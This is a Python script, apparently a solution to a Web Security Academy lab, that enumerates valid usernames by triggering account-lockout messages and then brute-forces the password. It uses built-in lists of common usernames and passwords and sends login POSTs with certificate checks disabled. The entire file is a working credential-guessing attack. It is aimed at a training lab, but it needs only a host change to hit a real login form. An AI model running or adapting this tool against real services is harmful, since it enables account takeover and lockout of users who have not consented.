import http.client
import re
import ssl
import random
import string
import time

LAB_ID = "???"


def POST_login(
        username: str,
        password: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    body = f'username={username}&password={password}'
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def is_username_valid(username: str) -> bool:
    for i in range(5):
        POST_login(username, str(random.randint(10000, 999999)))
    response = POST_login(username, str(random.randint(10000, 999999)))
    return response.status != 200 or 'Invalid username or password' not in response.read().decode('utf-8')


def is_password_valid(username: str, password: str) -> bool:
    response = POST_login(username, password)
    body = response.read().decode('utf-8')
    return 'Invalid username or password' not in body and 'too many' not in body


usernames = ['carlos', 'root', 'admin', 'test', 'guest', 'info', 'adm', 'mysql', 'user', 'administrator', 'oracle',
             'ftp', 'pi', 'puppet', 'ansible', 'ec2-user', 'vagrant', 'azureuser', 'academico', 'acceso', 'access',
             'accounting', 'accounts', 'acid', 'activestat', 'ad', 'adam', 'adkit', 'admin', 'administracion',
             'administrador', 'administrator', 'administrators', 'admins', 'ads', 'adserver', 'adsl', 'ae', 'af',
             'affiliate', 'affiliates', 'afiliados', 'ag', 'agenda', 'agent', 'ai', 'aix', 'ajax', 'ak', 'akamai', 'al',
             'alabama', 'alaska', 'albuquerque', 'alerts', 'alpha', 'alterwind', 'am', 'amarillo', 'americas', 'an',
             'anaheim', 'analyzer', 'announce', 'announcements', 'antivirus', 'ao', 'ap', 'apache', 'apollo', 'app',
             'app01', 'app1', 'apple', 'application', 'applications', 'apps', 'appserver', 'aq', 'ar', 'archie',
             'arcsight', 'argentina', 'arizona', 'arkansas', 'arlington', 'as', 'as400', 'asia', 'asterix', 'at',
             'athena', 'atlanta', 'atlas', 'att', 'au', 'auction', 'austin', 'auth', 'auto', 'autodiscover']
passwords = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon',
             '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666',
             'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777',
             '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh',
             'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000',
             'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george',
             'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom',
             '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda',
             'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321',
             'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana',
             'moon', 'moscow']
valid_username = None

if valid_username is None:
    for i, username in enumerate(usernames):
        print(f'done {int(i/len(usernames)*100)}% trying {username}')
        if is_username_valid(username):
            print(f'found valid username: {username}')
            valid_username = username
            break
    else:
        print('could not find any valid username')

if valid_username is not None:
    for i, password in enumerate(passwords):
        print(f'done {int(i/len(passwords)*100)}% trying {valid_username}:{password}')
        if is_password_valid(valid_username, password):
            print(f'for username {valid_username} found valid password: {password}')
            break
    else:
        print(f'for username {valid_username} could not find valid password')
